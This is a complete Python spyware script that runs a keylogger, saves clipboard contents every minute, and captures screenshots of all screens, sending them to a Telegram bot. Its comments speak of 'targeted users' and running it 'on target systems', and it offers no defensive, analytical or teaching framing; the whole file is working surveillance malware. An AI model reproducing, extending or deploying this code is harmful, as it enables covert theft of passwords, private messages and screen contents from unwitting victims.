import asyncio
import time
from sys import argv
from PIL import ImageGrab
from inputimeout import inputimeout, TimeoutOccurred
from pynput.keyboard import Listener
from pyperclip import paste, PyperclipWindowsException
from telegram import Bot
import aiofiles
import os

# Set the delay for keylogger, clipboard checking, and screenshot sending
delay = 60
screenshot_interval = 60  # 60 seconds

# Set the location for storing the output; local folder
data_store = r"C:\Temp"

# By default, we assume the tool is run by the targeted users themselves
in_our_hands = False

# Initialize counter variable for unique filenames
loop_count = 0

# Set Telegram bot token and chat ID
TELEGRAM_BOT_TOKEN = ''
TELEGRAM_CHAT_ID = ''

# Initialize Telegram bot
bot = Bot(token=TELEGRAM_BOT_TOKEN)

# If a command line argument is provided, the tool is run by us on target systems
if len(argv) == 2:
    in_our_hands = True
    data_store = argv[1]

# Ensure the data store directory exists
os.makedirs(data_store, exist_ok=True)

def on_press(key_press):
    """This function records keys being pressed. Called by pynput.keyboard's Listener start method."""
    try:
        with open(os.path.join(data_store, "Keys.log"), "a") as fh:
            fh.write(str(key_press).replace("Key.enter", "\n")
                     .replace("'", "").replace("Key.space", " ")
                     .replace('""', "'").replace("Key.shift_r", "")
                     .replace("Key.shift_l", "").replace("Key.shift", ""))
    except OSError:
        if in_our_hands:
            print(f"Failed to log key: {key_press}")

async def send_screenshot_to_telegram(file_path):
    """Send the screenshot to the Telegram bot asynchronously."""
    try:
        async with aiofiles.open(file_path, 'rb') as photo:
            await bot.send_photo(chat_id=TELEGRAM_CHAT_ID, photo=await photo.read())
        if in_our_hands:
            print(f"Screenshot sent successfully: {file_path}")
    except Exception as e:
        if in_our_hands:
            print(f"Failed to send screenshot to Telegram: {e}")

async def save_clipboard():
    """Save clipboard content to a file."""
    global loop_count
    try:
        clipboard_content = paste()
        async with aiofiles.open(os.path.join(data_store, f"clipboard_{loop_count}.txt"), "w") as file_handle:
            await file_handle.write(clipboard_content)
    except OSError:
        if in_our_hands:
            print("An OS error occurred while writing out the clipboard data.")
    except PyperclipWindowsException:
        if in_our_hands:
            print("The computer's screen is locked right now.")

async def capture_and_send_screenshot():
    """Capture a screenshot and send it to Telegram."""
    global loop_count
    try:
        screenshot = ImageGrab.grab(all_screens=True)
        screenshot_file = os.path.join(data_store, f"screenshot_{loop_count}.png")
        screenshot.save(screenshot_file)
        await send_screenshot_to_telegram(screenshot_file)
    except OSError:
        if in_our_hands:
            print("An OS error occurred while capturing or sending the screenshot.")

async def main():
    # Start the keylogger thread
    listener = Listener(on_press=on_press)
    listener.start()

    global loop_count
    last_screenshot_time = time.time()

    while True:
        loop_count += 1

        # Save clipboard content
        await save_clipboard()

        # Capture and send screenshot if interval has passed
        current_time = time.time()
        if current_time - last_screenshot_time >= screenshot_interval:
            await capture_and_send_screenshot()
            last_screenshot_time = current_time  # Reset the timer after sending

        # If in our hands, allow manual termination
        if in_our_hands:
            try:
                inputimeout(prompt=f"Loop {loop_count} complete. Strike the ENTER key to end.", timeout=delay)
            except TimeoutOccurred:
                pass
            else:
                break

        # Sleep asynchronously before the next loop iteration
        await asyncio.sleep(delay)

    listener.stop()

# Start the asyncio event loop
if __name__ == "__main__":
    asyncio.run(main())
